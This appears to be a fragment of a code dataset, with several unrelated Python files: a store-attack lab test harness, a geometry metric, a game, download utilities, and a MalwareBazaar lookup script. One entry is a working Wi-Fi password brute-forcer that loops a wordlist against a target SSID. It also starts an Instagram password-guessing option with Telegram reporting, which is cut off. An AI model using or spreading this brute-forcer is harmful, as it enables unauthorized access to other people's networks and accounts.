href=\"https://spotify-github-profile.vercel.app/api/view?uid=7zvqbn3nvuqnm2ypk2ib1y1sp&redirect=true\">\n      <img wi",
    "import store\nimport attack\nimport client\nimport traceback\n\ndef scenario_one():\n    s = store.Store()\n    c = client.Client(s)\n\n    k = b'hello'\n    v = b'world'\n    c.insert(k, v)\n\n    a = attack.AttackOne(s)\n    c._store = a\n    ak = a.attack_fake_key()\n\n    r = c.lookup(ak)\n\n    if type(ak) != bytes or ak == k:\n        raise Exception(\"attack key must be different from k\")\n\n    if r is None:\n        raise Exception(\"attack lookup returns None\")\n\ndef scenario_two():\n    s = store.Store()\n    c = client.Client(s)\n\n    a = attack.AttackTwo(s)\n    keys = a.attack_fake_keys()\n    k, v = a.attack_key_value()\n\n    if not all([type(k) == bytes for k in keys]):\n        raise Exception(\"fake keys must all be bytes\")\n    if len(set(keys)) < 1000:\n        raise Exception(\"less than 1000 fake keys\")\n    if len(k) + len(v) > 100:\n        raise Exception(\"chosen key/value too long\")\n\n    c.insert(k, v)\n    c._store = a\n    for k in keys:\n        r = c.lookup(k)\n        if r is None:\n            raise Exception(\"fake key %s not found\" % k)\n\nclass EnforceOneSiblingLookupProof(attack.AttackThree):\n    def lookup(self, key):\n        pf = super().lookup(key)\n        if len(pf.siblings) != 1:\n            raise Exception(\"expected one sibling in proof, got %d\" % len(pf.siblings))\n        return pf\n\ndef scenario_three():\n    s = store.Store()\n    c = client.Client(s)\n\n    for i in range(1000):\n        k = b'k%d' % i\n        v = b'v%d' % i\n        c.insert(k, v)\n\n    a = EnforceOneSiblingLookupProof(s)\n    c._store = a\n\n    for i in range(1000):\n        k = b'k%d' % i\n        v = b'v%d' % i\n        r = c.lookup(k)\n        if r is not None:\n            raise Exception(\"key %s is still present, value %s\" % (k, r))\n\ndef scenario_four():\n    s = store.Store()\n    a = attack.AttackFour(s)\n    c = client.Client(a)\n\n    for i in range(1000):\n        k = b'k%d' % i\n        v = b'v%d' % i\n        c.insert(k, v)\n\n    ak = a.attack_fake_key()\n    if type(ak) != bytes:\n        raise Exception(\"fake key must be bytes\")\n\n    av = c.lookup(ak)\n    if av is None:\n        raise Exception(\"fake key not present\")\n    if len(ak) + len(av) < 1000:\n        raise Exception(\"fake key and value not long enough\")\n\nchecks = {\n    \"one\": scenario_one,\n    \"two\": scenario_two,\n    \"three\": scenario_three,\n    \"four\": scenario_four,\n}\n\nif __name__ == '__main__':\n    for n, f in checks.items():\n        try:\n            f()\n            print(\"%s: pass\" % n)\n        except:\n            traceback.print_exc()\n            print(\"%s: fail\" % n)\n",
    "from shapely.geometry import Polygon\nimport numpy as np\nfrom tqdm import tqdm\n\n\ndef getIOU(polygon1: Polygon, polygon2: Polygon) -> float:\n    intersection = polygon1.intersection(polygon2).area\n    union = polygon1.union(polygon2).area\n    if union == 0:\n        return 0\n    return intersection / union\n\n\ndef compute_pq(gt_polygons: list, pred_polygons: list, iou_threshold=0.5):\n    matched_instances = {}\n    gt_matched = np.zeros(len(gt_polygons))\n    pred_matched = np.zeros(len(pred_polygons))\n\n    gt_matched = np.zeros(len(gt_polygons))\n    pred_matched = np.zeros(len(pred_polygons))\n    for gt_idx, gt_polygon in tqdm(enumerate(gt_polygons)):\n        best_iou = iou_threshold\n        best_pred_idx = None\n        for pred_idx, pred_polygon in enumerate(pred_polygons):\n            if gt_matched[gt_idx] == 1 or pred_matched[pred_idx] == 1:\n                continue\n            \n            iou = getIOU(gt_polygon, pred_polygon)\n            if iou == 0:\n                continue\n            \n            if iou > best_iou:\n                best_iou = iou\n                best_pred_idx = pred_idx\n        if best_pred_idx is not None:\n            matched_instances[(gt_idx, best_pred_idx)] = best_iou\n            gt_matched[gt_idx] = 1\n            pred_matched[best_pred_idx] = 1\n\n    \n    sq_sum = sum(matched_instances.values())\n    num_matches = len(matched_instances)\n    sq = sq_sum / num_matches if num_matches else 0\n    rq = num_matches / (len(gt_polygons) + ((len(pred_polygons) - num_matches)/2.0)) if (gt_polygons or pred_polygons) else 0\n    pq = sq * rq\n\n    return pq, sq, rq\n\n\n\ndef test_compute_pq():\n    polygon1 = Polygon([(1, 2), (2, 4), (3, 1)])\n    polygon2 = Polygon([(0, 0), (1, 3), (2, 2), (3, 0)])\n    polygon3 = Polygon([(5, 5), (6, 6), (7, 5), (8, 4), (5, 3)])\n    polygon4 = Polygon([(2, 2), (3, 4), (4, 4), (5, 2), (3, 1)])\n    polygon5 = Polygon([(4, 4), (5, 6), (7, 7), (8, 5), (7, 4)])\n    polygon6 = Polygon([(1, 1), (2, 3), (3, 3), (2, 1)])\n    polygon7 = Polygon([(3, 3), (4, 5), (6, 5), (7, 3), (5, 2)])\n    \n    true_polygons = [polygon1, polygon3, polygon5, polygon7]\n    pred_polygons = [polygon1, polygon2, polygon3, polygon7]\n    \n    pq, sq, rq = compute_pq(true_polygons, pred_polygons)\n    assert pq == 0.6\n    assert sq == 1\n    assert rq == 0.6\n    \ndef test_get_iou():\n    polygon1 = Polygon([(0, 0), (0, 1), (1, 1), (1, 0)])\n    polygon2 = Polygon([(0, 0), (0, 1), (2, 1), (2, 0)])\n    \n    assert getIOU(polygon1, polygon2) == 0.5\n    \n    \n    ",
    "import pygame\r\nimport sys\r\n\r\npygame.init()\r\n\r\n# \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043e\u0441\u043d\u043e\u0432\u043d\u044b\u0445 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445\r\nwindow_width = 600\r\nwindow_height = 400\r\nwindow = pygame.display.set_mode((window_width, window_height))\r\npygame.display.set_caption('Flappy Bird Clone')\r\n\r\nbackground_color = (135, 206, 250)\r\nbird_color = (255, 165, 0)\r\nbird_width = 40\r\nbird_height = 30\r\nbird_x = 50\r\nbird_y = 200\r\nbird_speed = 0\r\ngravity = 0.25\r\n\r\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0438 \u043f\u0442\u0438\u0446\u044b\r\ndef draw_bird(x, y):\r\n    pygame.draw.rect(window, bird_color, (x, y, bird_width, bird_height))\r\n\r\n# \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0446\u0438\u043a\u043b \u0438\u0433\u0440\u044b\r\nwhile True:\r\n    for event in pygame.event.get():\r\n        if event.type == pygame.QUIT:\r\n            pygame.quit()\r\n            sys.exit()\r\n\r\n        if event.type == pygame.KEYDOWN:\r\n            if event.key == pygame.K_SPACE:\r\n                bird_speed = -5\r\n\r\n    # \u041f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0433\u0440\u0430\u0432\u0438\u0442\u0430\u0446\u0438\u0438\r\n    bird_speed += gravity\r\n    bird_y += bird_speed\r\n\r\n    # \u041e\u0447\u0438\u0441\u0442\u043a\u0430 \u044d\u043a\u0440\u0430\u043d\u0430 \u0438 \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0444\u043e\u043d\u0430\r\n    window.fill(background_color)\r\n\r\n    # \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043f\u0442\u0438\u0446\u044b\r\n    draw_bird(bird_x, bird_y)\r\n\r\n    pygame.display.update()",
    "import asyncio\nimport builtins\nimport contextlib\nimport os\nimport random\nimport subprocess\nimport time\nimport typing as tp\n\n\ndef seed_all(seed: int):\n    import numpy\n    import torch\n\n    os.environ[\"PYTHONHASHSEED\"] = str(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)\n    random.seed(seed)\n    numpy.random.seed(seed)\n\n\ndef get_env_var_or_default(var_name, default_value):\n    \"\"\"\n    Attempts to load a global variable from an environment variable.\n\n    Args:\n    - var_name (str): Name of the global variable.\n    - default_value: The default value to use if the environment variable doesn't exist or its length is 0.\n\n    Returns:\n    - value: The value from the environment variable or the default value.\n    \"\"\"\n    env_value = os.environ.get(var_name, \"\")\n\n    # Check if the environment variable exists and is not empty\n    if len(env_value) > 0:\n        return env_value\n    return default_value\n\n\nclass Logger:\n    def __init__(self, marker: str = \"predict-timings\"):\n        self.marker = marker + \"%s\" % random.randint(0, 1000000)\n        self.start = time.time()\n        self.last = self.start\n\n    def log(self, *args):\n        current_time = time.time()\n        elapsed_since_start = current_time - self.start\n        elapsed_since_last_log = current_time - self.last\n\n        message = \" \".join(str(arg) for arg in args)\n        timings = f\"{elapsed_since_start:.2f}s since start, {elapsed_since_last_log:.2f}s since last log\"\n\n        print(f\"{self.marker}: {message} - {timings}\")\n        self.last = current_time\n\n\ndef get_loop() -> asyncio.AbstractEventLoop:\n    try:\n        return asyncio.get_running_loop()\n    except RuntimeError:\n        return asyncio.new_event_loop()\n\n\ndef download_file(file, local_filename):\n    print(f\"Downloading {file} to {local_filename}\")\n    if os.path.exists(local_filename):\n        os.remove(local_filename)\n    if \"/\" in local_filename:\n        if not os.path.exists(os.path.dirname(local_filename)):\n            os.makedirs(os.path.dirname(local_filename), exist_ok=True)\n\n    command = [\"pget\", file, local_filename]\n    subprocess.check_call(command, close_fds=True)\n\n\ndef check_files_exist(remote_files: list[str], local_path: str) -> list[str]:\n    # Get the list of local file names\n    local_files = os.listdir(local_path)\n\n    # Check if each remote file exists in the local directory\n    missing_files = list(set(remote_files) - set(local_files))\n\n    return missing_files\n\n\nasync def download_file_with_pget(remote_path, dest_path, pget_concurrency=\"10\"):\n    # Create the subprocess\n    print(\"Downloading \", remote_path)\n    if remote_path.endswith(\"json\"):\n        info = (\n            \"%{filename_effective} took %{time_total}s (%{speed_download} bytes/sec)\\n\"\n        )\n        args = [\"curl\", \"-w\", info, \"-sLo\", dest_path, remote_path]\n    else:\n        args = [\"pget\", \"-c\", pget_concurrency, remote_path, dest_path]\n    process = await asyncio.create_subprocess_exec(\n        *args,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE,\n        close_fds=True,\n    )\n\n    # Wait for the subprocess to finish\n    stdout, stderr = await process.communicate()\n\n    # Print what the subprocess output (if any)\n    if stdout:\n        print(f\"[stdout]\\n{stdout.decode()}\")\n    if stderr:\n        print(f\"[stderr]\\n{stderr.decode()}\")\n\n\nasync def download_files_with_pget(\n    remote_path: str, path: str, files: list[str]\n) -> None:\n    download_jobs = \"\\n\".join(f\"{remote_path}/{f} {path}/{f}\" for f in files)\n    print(download_jobs)\n    args = [\"pget\", \"multifile\", \"-\", \"-f\", \"--max-conn-per-host\", \"100\"]\n    process = await asyncio.create_subprocess_exec(*args, stdin=-1, close_fds=True)\n    # Wait for the subprocess to finish\n    await process.communicate(download_jobs.encode())\n\n\ndef maybe_download_with_pget(\n    path: str,\n    remote_path: tp.Optional[str] = None,\n    remote_filenames: tp.Optional[list[str]] = None,\n    logger: tp.Optional[Logger] = None,\n):\n    \"\"\"\n    Downloads files from remote_path to path if they are not present in path. File paths are constructed\n    by concatenating remote_path and remote_filenames. If remote_path is None, files are not downloaded.\n\n    Args:\n        path (str): Path to the directory where files should be downloaded\n        remote_path (str): Path to the directory where files should be downloaded from\n        remote_filenames (List[str]): List of file names to download\n\n    Returns:\n        path (str): Path to the directory where files were downloaded\n\n    Example:\n\n        maybe_download_with_pget(\n            path=\"models/roberta-base\",\n            remote_path=\"gs://my-bucket/models/roberta-base\",\n            remote_filenames=[\"config.json\", \"pytorch_model.bin\", \"tokenizer.json\", \"vocab.json\"],\n        )\n    \"\"\"\n    if remote_path:\n        remote_path = remote_path.rstrip(\"/\")\n        if not os.path.exists(path):\n            os.makedirs(path, exist_ok=True)\n            ",
    "\"\"\"\nModules:\n    - internal:\n        - description: Already Comes installed with your python interpreter.\n        - contents:\n            pathlib.Path (class)\n            os.scandir (function)\n            os.path.dirname (function)\n            os.path.abspath (function)\n            inspect\n    - external:\n        - description: Needs to be installed using pip.\n    - Project Specific\n        - description: Modules made for this project.\n\nHierarchy:\n    - pasta_docs.py\n        - contents:\n            - docstring (class)\n                -contents:\n                    __init__\n                    list_recursive\n                    listRecurseF\n                    fetch\n\ndocstring class:\n    - description: docstring class is made to fetch the docstring of a file just for pasta-man.\n\n__init__:\n    - description: This method is called as soon as the docstring class is initialized.\n\nlist_recursive:\n    - description: This method can return a list of all complete module paths of pasta-man.\n    - return:\n        - type: list[str]\n\nlistRecurseF:\n    - description: print level wise hierarchy of modules of pasta-man\n\nfetch:\n    - description: fetch the main docstring from the module file.\n    - params:\n        - module:\n            - description: the module whose docstring needs to be fetched.\n            - type: str\n\nworking:\n    - This file is responsible for resolving and fetching docstrings defined inside the modules.\n\"\"\"\n\n# import internal modules\nfrom os.path import dirname, abspath\nfrom os import scandir\nfrom pathlib import Path\nimport inspect\n\n# class definition\nclass Docstring:\n    # __init__ function\n    def __init__(self):\n        \"\"\"## Initialise the docstring class\n        \"\"\"\n        self.parentmodule = \"pasta_man\"\n        self.directory = dirname(dirname(abspath(__file__))) # inside pasta_man dir\n        # print(self.directory)\n    \n    def __fetch(self, submod: list[str] = [], daddy:bool = False) -> str | None:\n        \"\"\"## fetch the docstring of the given submodule of pasta-man\n\n        ### Args:\n            - `submod (list[str], optional)`: submodule of pasta-man. Defaults to [].\n            - `daddy (bool, optional)`: Set this to True if you want to fetch docstring of parent module -> pasta-man. Defaults to False.\n\n        ### Returns:\n            - `str | None`: Returns docstring if defined, else None.\n        \"\"\"\n        # if parent module is queried.\n        if daddy or len(submod)==0:\n            try:\n                module = __import__(self.parentmodule)\n                return inspect.getdoc(module)\n            except ImportError:\n                return None\n        # if a submod is provided.\n        else:\n            # check the submod if there is more values to it.\n            if len(submod)>1:\n                submodules = submod\n                submodlast = submodules[len(submodules)-1] # last element\n                submodulesfirsts = submodules[:len(submodules)-1] # all other element in order.\n                \n                # merge the first elements to daddy\n                dadmod = self.parentmodule\n                for x in submodulesfirsts:\n                    dadmod += f\".{x}\"\n                \n                # find docstring if any\n                try:\n                    module = __import__(dadmod, fromlist=[submodlast])\n                    submodule = getattr(module, submodlast)\n                    return inspect.getdoc(submodule)\n                except (ImportError, AttributeError):\n                    return None\n            elif len(submod)==1:\n                try:\n                    module = __import__(self.parentmodule, fromlist=[submod[0]])\n                    submodule = getattr(module, submod[0])\n                    return inspect.getdoc(submodule)\n                except (ImportError, AttributeError):\n                    return None\n    \n    def __scan_recursive(self, directory: str):\n        \"\"\"## recursively scan a directory to list all paths\n\n        ### Args:\n            - `directory (str)`: directory to be scanned.\n\n        ### Yields:\n            - `Generator[DirEntry[str] | Any, Any, None]`\n        \"\"\"\n        for entry in scandir(directory):\n            if entry.is_file():\n                yield entry\n            else:\n                yield from self.__scan_recursive(entry.path)\n    \n    def list_recursive(self) -> list[str]:\n        \"\"\"## list only pasta-man modules.\n\n        ### Returns:\n            - `list[str]`: list of pasta-man modules.\n        \"\"\"\n        modules = []\n        for item in self.__scan_recursive(self.directory):\n            path = str(Path(item))[1:].replace('.py', '').replace('/','.').replace('\\\\','.')\n            if '__pycache__' in path:\n                continue\n            \n            path = self.parentmodule+path.split(self.parentmodule)[1]\n            if path==self.parentmodule+\".\":\n                path = self.parentmodule+\".\"+self.parentmodule\n            modules.append(path)\n        \n        return modules\n    \n    def __construct_hiera",
    "try:\r\n    import requests, random, os, time\r\n    from user_agent import generate_user_agent\r\n    from ast import Pass \r\n    from pywifi import *\r\nexcept ModuleNotFoundError:\r\n    os.system(\"pip install requests random os user_agent ast pywifi time\")\r\n    \r\n    os.system(\"clear\")\r\n\r\nBlack = \"\\033[1;30m\"\r\nRed = \"\\033[1;31m\"\r\nGreen = \"\\033[1;32m\"\r\nYellow = \"\\033[1;33m\"\r\nBlue = \"\\033[1;34m\"\r\nPurple = \"\\033[1;35m\"\r\nCyan = \"\\033[1;36m\"\r\nWhite = \"\\033[1;37m\"\r\nGray = \"\\033[1;39m\"\r\nDarkRed = \"\\033[2;31m\"\r\nDarkBlue = \"\\033[2;34m\"\r\nDarkPink = \"\\033[2;35m\"\r\nDarkCyan = \"\\033[2;36m\"\r\n\r\nprint(\"\"\"\\033[1;35m\r\n            ___----------___\r\n         _--                ----__\r\n        -                         ---_\r\n       -___    ____---_              --_\r\n   __---_ .-_--   _ O _-                -\r\n  -      -_-       ---                   -\r\n -   __---------___                       -\r\n - _----                                  -\r\n  -     -_                                 _\r\n  `      _-                                 _\r\n        _                           _-_  _-_ _\r\n       _-                   ____    -_  -   --\r\n       -   _-__   _    __---    -------       -\r\n      _- _-   -_-- -_--                        _\r\n      -_-                                       _\r\n     _-                \\033[1;37mv0.0.0\\033[1;35m                    _\r\n\r\n\\n\\033[1;37mTHIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.\\nPERSONAL WEBSITE : \\033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html\"\"\")\r\nprint(\"\\033[1;37m- \"*35)\r\n\r\ndef main_menu():\r\n    print(\"\"\"\\033[1;37m[\\033[1;35m1\\033[1;37m] - Wi-Fi\r\n\\033[1;37m[\\033[1;35m2\\033[1;37m] - Instagram\r\n[\\033[1;35m99\\033[1;37m] - Exit\"\"\")\r\n\r\ndef handle_selection(selection):\r\n    if selection == \"1\" or selection == \"Wi-Fi\" or selection == \"WI-FI\" or selection == \"wi-fi\":\r\n        try:\r\n            wifi = PyWiFi()\r\n            INF = wifi.interfaces()[0]\r\n            INF.scan()\r\n            Rscan = INF.scan_results()\r\n        except: print(\"\\033[1;31mWi-Fi not found!\\033[1;37m\")\r\n\r\n        def wifi(ssid, password):\r\n            prof = Profile()\r\n            prof.ssid = ssid\r\n            prof.auth = const.AUTH_ALG_OPEN\r\n            prof.akm.append(const.AKM_TYPE_WPA2PSK)\r\n            prof.cipher = const.CIPHER_TYPE_CCMP\r\n            prof.key = password\r\n            INF.remove_all_network_profiles()\r\n            TEMP_PROF = INF.add_network_profile(prof)\r\n            INF.connect(TEMP_PROF)\r\n\r\n            time.sleep(0.5)\r\n\r\n            if INF.status() == const.IFACE_CONNECTED:\r\n                print(f\"\\033[1;37m[\\033[1;32m\u2713\\033[1;37m] Pass : \\033[1;35m{password}\")\r\n                return True\r\n\r\n            else: \r\n                print(f\"\"\"\\033[1;37m[\\033[1;31m\u2715\\033[1;37m] Pass \\033[1;35m{password} \\033[1;37mis False!\"\"\")\r\n                return False\r\n\r\n        ssid = input(\"\\033[1;37m[\\033[1;35m+\\033[1;37m] Entet the SSID (Wi-Fi name) : \\033[1;35m\")\r\n        passwords = input(\"\"\"\\033[1;37m[\\033[1;35m+\\033[1;37m] Enter the name of the passwords file : \r\n    \\033[1;31m(if you don't have it, do one of these things :\r\n    \u2022 Download it to your device from https://t.me/tler_sa/80\r\n    \u2022 Search for these files on the internet and download them to your device\r\n    \u2022 Create a file using the Crunch tool)\\n\\033[1;35m\"\"\")\r\n\r\n        try:\r\n            filee = open(passwords, \"r\")\r\n            for Pass in filee.readlines():\r\n                Pass = Pass.strip()\r\n                if wifi(ssid, Pass): break\r\n        except: print(f\"\\033[1;31mFile \\033[1;35m{passwords}\\033[1;31m not found!\\033[1;37m\")\r\n        \r\n        another_operation = input(\"\\033[1;37mWould you like another operation? (\\033[1;35mY\\033[1;37m/\\033[1;35mN\\033[1;37m) \\033[1;35m\")\r\n        if another_operation == \"Y\" or another_operation == \"y\" or another_operation == \"Yes\" or another_operation == \"yes\" or another_operation == \"YES\": main_menu()\r\n        elif another_operation == \"N\" or another_operation == \"n\" or another_operation == \"No\" or another_operation == \"no\" or another_operation == \"No\": exit(\"\\033[1;37m\")\r\n\r\n    elif selection == \"2\" or selection == \"Instagram\" or selection == \"instagram\" or selection == \"INSTAGRAM\":\r\n        send_tele = input(\"\\033[1;37m[\\033[1;35m+\\033[1;37m] Do you want to send info to the Telegram? \\033[1;37m(\\033[1;33mY\\033[1;37m/\\033[1;33mN\\033[1;37m) \\033[1;33m\")\r\n        if send_tele == \"Y\" or send_tele == \"y\" or send_tele == \"Yes\" or send_tele == \"yes\":\r\n            ID = input(\"\\033[1;37m[\\033[1;35m1\\033[1;37m] Enter your Telegram ID \\033[1;37m: \\033[1;35m\")\r\n            token = input(\"\\033[1;37m[\\033[1;35m2\\033[1;37m] Enter your Telegram bot token \\033[1;37m: \\033[1;35m\")\r\n        elif send_tele == \"N\" or send_tele == \"n\" or send_tele == \"No\" or send_tele == \"no\": None\r\n        else: print(\"\\033[1;31mPlease choose \\033[1;37m(\\033[1;33mY\\033[1;37m/\\033[1;33mN\\033[1;37m)!\")\r\n\r\n        r = requests.Session()\r\n\r\n        filee = input(\"\"\"\\033[1;37m[\\033[1;35m+\\033[1;37m] Enter the name of the passwords file\r\n    \\033[1;31m(if you",
    "import cv2\r\nimport os\r\nimport numpy as np\r\nimport tkinter as tk\r\nfrom tkinter import filedialog, messagebox, ttk\r\nimport webbrowser\r\n\r\nclass PotatoDotsCounterGUI:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"Potato Counter Strike\")\r\n        self.root.configure(bg=\"pink\")\r\n\r\n        self.folder_path = ''\r\n        self.output_folder = ''\r\n        self.threshold_step = 1\r\n        self.blob_color = 0\r\n        self.inertia_ratio = 0.2\r\n\r\n        self.create_widgets()\r\n        self.add_logo()\r\n        self.add_author_link()\r\n\r\n    def create_widgets(self):\r\n        # Buttons\r\n        self.open_folder_button = ttk.Button(self.root, text=\"Choose Input Folder\", command=self.open_folder, style='C.TButton')\r\n        self.open_folder_button.pack()\r\n\r\n        self.choose_output_folder_button = ttk.Button(self.root, text=\"Choose Output Folder\", command=self.choose_output_folder, style='C.TButton')\r\n        self.choose_output_folder_button.pack()\r\n\r\n        self.run_button = ttk.Button(self.root, text=\"Start\", command=self.run_detection, style='C.TButton')\r\n        self.run_button.pack()\r\n\r\n        self.exit_button = ttk.Button(self.root, text=\"Quit\", command=self.root.quit, style='C.TButton')\r\n        self.exit_button.pack()\r\n\r\n        # ThresholdStep slider\r\n        self.threshold_step_label = tk.Label(self.root, text=\"smaller = more dots!:\")\r\n        self.threshold_step_label.pack()\r\n        self.threshold_step_slider = ttk.Scale(self.root, from_=1, to=10, orient=tk.HORIZONTAL, command=self.update_threshold_step)\r\n        self.threshold_step_slider.pack()\r\n\r\n        # BlobColor entry\r\n        self.blob_color_label = tk.Label(self.root, text=\"Dots Type? (0=black, 255=white):\")\r\n        self.blob_color_label.pack()\r\n        self.blob_color_entry = tk.Entry(self.root)\r\n        self.blob_color_entry.pack()\r\n\r\n        # InertiaRatio slider\r\n        self.inertia_ratio_label = tk.Label(self.root, text=\"How round your dots are?:\")\r\n        self.inertia_ratio_label.pack()\r\n        self.inertia_ratio_slider = ttk.Scale(self.root, from_=0, to=1, orient=tk.HORIZONTAL, command=self.update_inertia_ratio)\r\n        self.inertia_ratio_slider.pack()\r\n\r\n        # Output text box\r\n        self.output_text = tk.Text(self.root, height=10, width=50)\r\n        self.output_text.pack()\r\n\r\n    def add_logo(self):\r\n        logo_path = \"_internal/logo.png\"\r\n        if os.path.exists(logo_path):\r\n            self.logo_img = tk.PhotoImage(file=logo_path)\r\n            self.logo_label = tk.Label(self.root, image=self.logo_img, bg=\"pink\")\r\n            self.logo_label.pack()\r\n\r\n    def add_author_link(self):\r\n        author_label = tk.Label(self.root, text=\"AUTHOR: 0YJ\", fg=\"purple\", cursor=\"hand2\")\r\n        author_label.pack()\r\n        author_label.bind(\"<Button-1>\", lambda e: webbrowser.open_new(\"https://github.com/0yj\"))\r\n\r\n    def open_folder(self):\r\n        self.folder_path = filedialog.askdirectory()\r\n        self.log_message(f\"Selected folder: {self.folder_path}\")\r\n\r\n    def choose_output_folder(self):\r\n        self.output_folder = filedialog.askdirectory()\r\n        self.log_message(f\"Selected output folder: {self.output_folder}\")\r\n\r\n    def update_threshold_step(self, val):\r\n        self.threshold_step = float(val)\r\n\r\n    def update_inertia_ratio(self, val):\r\n        self.inertia_ratio = float(val)\r\n\r\n    def run_detection(self):\r\n        if not self.folder_path or not self.output_folder:\r\n            messagebox.showerror(\"Error\", \"Please select input and output folders.\")\r\n            return\r\n\r\n        image_files = [os.path.join(self.folder_path, f) for f in os.listdir(self.folder_path) if os.path.isfile(os.path.join(self.folder_path, f))]\r\n\r\n        for image_file in image_files:\r\n            image = cv2.imread(image_file)\r\n            gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\n            gauss = cv2.GaussianBlur(gray, (5,5), 0)\r\n\r\n            params = cv2.SimpleBlobDetector_Params()\r\n            params.minThreshold= 10\r\n            params.maxThreshold = 250\r\n            params.thresholdStep = self.threshold_step\r\n\r\n            params.filterByColor = True\r\n            params.blobColor = int(self.blob_color_entry.get()) if self.blob_color_entry.get() else 0\r\n\r\n            params.filterByArea = True\r\n            params.minArea = 12\r\n            params.maxArea = 666\r\n\r\n            params.filterByCircularity = True\r\n            params.minCircularity = 0.1\r\n\r\n            params.filterByConvexity = True\r\n            params.minConvexity = 0.1\r\n\r\n            params.filterByInertia = True\r\n            params.minInertiaRatio = self.inertia_ratio\r\n\r\n            detector = cv2.SimpleBlobDetector_create(params)\r\n            keypoints = detector.detect(gauss)\r\n            self.log_message(f\"Detected {len(keypoints)} dots in {image_file}\")\r\n\r\n            # Add text with number of keypoints\r\n            text = \"Number of Dots: {}\".format(len(keypoints))\r\n            cv2.putText(image, text, (50, 50), cv2.FONT_HERSHE",
    "from pytest import raises\n\nfrom privates import (AccessError, class_modifier, friend, function_modifier,\n                      private, supports_private)\n\n\ndef test_class_modifier():\n    def inner():\n        @class_modifier\n        class Test:\n            def __init__(self, value: int) -> None:\n                self.value = value\n\n        t = Test(2)\n        assert t.value == 2\n        return Test\n\n    Test = inner()\n    with raises(AccessError):\n        Test(2)\n\n    with raises(TypeError):\n\n        @class_modifier  # type: ignore\n        def no_good(): ...\n\n    @friend(Test)\n    def hello():\n        t = Test(2)\n        t.value = 42\n        assert t.value == 42\n\n    hello()\n\n    @friend(Test)\n    class B:\n        def __init__(self):\n            self.t = Test(42)\n\n    B()\n\n\ndef test_function_modifier():\n    def inner():\n        @function_modifier\n        def hello(a: int):\n            return a + 1\n\n        assert hello(1) == 2\n        return hello\n\n    hello = inner()\n    with raises(AccessError):\n        hello(1)\n\n\ndef test_private():\n    def a():\n        @private\n        class A:\n            def __init__(self):\n                self.value = 1\n\n        assert A().value == 1\n        return A\n\n    def b():\n        @private\n        def func_b():\n            return 1\n\n        assert func_b() == 1\n        return func_b\n\n    A = a()\n    func_b = b()\n\n    with raises(AccessError):\n        A()\n\n    with raises(AccessError):\n        func_b()\n\n    with raises(TypeError):\n        private(10)  # type: ignore\n\n\ndef test_private_protocol():\n    @supports_private\n    class A:\n        def __init__(self, value: int):\n            self._value = value\n            self._test = 0\n\n        @property\n        def value(self) -> int:\n            return self._value\n\n        def something(self):\n            self._value += 1\n\n        def another(self):\n            del self._test\n\n    a = A(1)\n    with raises(AccessError):\n        a._value\n\n    assert a.value == 1\n    a.something()\n    assert a.value == 2\n\n    with raises(AccessError):\n        del a._value\n\n    a.another()\n\n\ndef test_protected_protocol():\n    @supports_private\n    class A:\n        __protected__ = (\"value\",)\n\n        def __init__(self, value: int):\n            self.value = value\n\n        @property\n        def thing(self) -> int:\n            return self.value\n\n    class Hello(A):\n        def __init__(self):\n            super().__init__(1)\n\n        @property\n        def something(self) -> int:\n            return self.value\n\n    a = A(42)\n\n    with raises(AccessError):\n        a.value\n\n    assert a.thing == 42\n\n    hello = Hello()\n    assert hello.something == 1\n\n    with raises(AccessError):\n        hello.value\n\n\ndef test_friends():\n    @supports_private\n    class A:\n        def __init__(self, value: int):\n            self._value = value\n\n    @friend(A)\n    class B:\n        def __init__(self):\n            self.a = A(42)\n\n        @property\n        def value(self) -> int:\n            return self.a._value\n\n    b = B()\n    assert b.value == 42\n\n    @friend(A)\n    def test():\n        a = A(10)\n        assert a._value == 10\n\n    test()\n\n    class C: ...\n\n    with raises(TypeError):\n\n        @friend(C)\n        def foo(): ...\n\n\ndef test_readonly():\n    @supports_private\n    class A:\n        __readonly__ = (\"value\",)\n\n        def __init__(self, value: int) -> None:\n            self.value = value\n\n    a = A(10)\n    assert a.value == 10\n\n    with raises(AccessError):\n        a.value = 42\n\n    with raises(AccessError):\n        del a.value\n\n    @friend(A)\n    def test():\n        a.value = 42\n\n    test()\n    assert a.value == 42\n",
    "#!/usr/bin/python\n\nimport requests\nimport json\nimport argparse\nimport os\nfrom pathlib import Path\n\ndef create_tag_string(tags):\n    if len(tags) == 0:\n        return \"\"\n    elif len(tags) == 1:\n        return tags[0]\n    else:\n        tag_string = \", \".join(tags[:-1])\n        tag_string += \" and \" + tags[-1]\n        return tag_string\n\ndef main():\n    parser = argparse.ArgumentParser(description = \"Pull data pertaining to filehash from MalwareBazzar by specifying hash associated with the malware.\")\n    parser.add_argument(\"hash\", help=\"Specify hash of file to query.\")\n    args = parser.parse_args()\n    #Make request for Data\n    query = {\"query\": \"post-data\", \"query\": \"get_info\", \"hash\": args.hash}\n    data_request = requests.post(\"https://mb-api.abuse.ch/api/v1/\", data=query)\n\n    data_request.raise_for_status()\n    json_string = data_request.text\n    json_python_value = json.loads(json_string)\n    if json_python_value[\"data\"][0][\"code_sign\"]:\n        subject_cn = json_python_value[\"data\"][0][\"code_sign\"][0][\"subject_cn\"]\n        issuer_cn = json_python_value[\"data\"][0][\"code_sign\"][0][\"issuer_cn\"]\n        serial_number = json_python_value[\"data\"][0][\"code_sign\"][0][\"serial_number\"]\n        thumbprint = json_python_value[\"data\"][0][\"code_sign\"][0][\"thumbprint\"]\n\n        tags = json_python_value[\"data\"][0][\"tags\"]\n        tag_string = create_tag_string(tags)\n        vendor_intel_dict = json_python_value[\"data\"][0][\"vendor_intel\"]\n    \n        print(\"\\n---------------------------------\\nGreetings,\\n \"\n       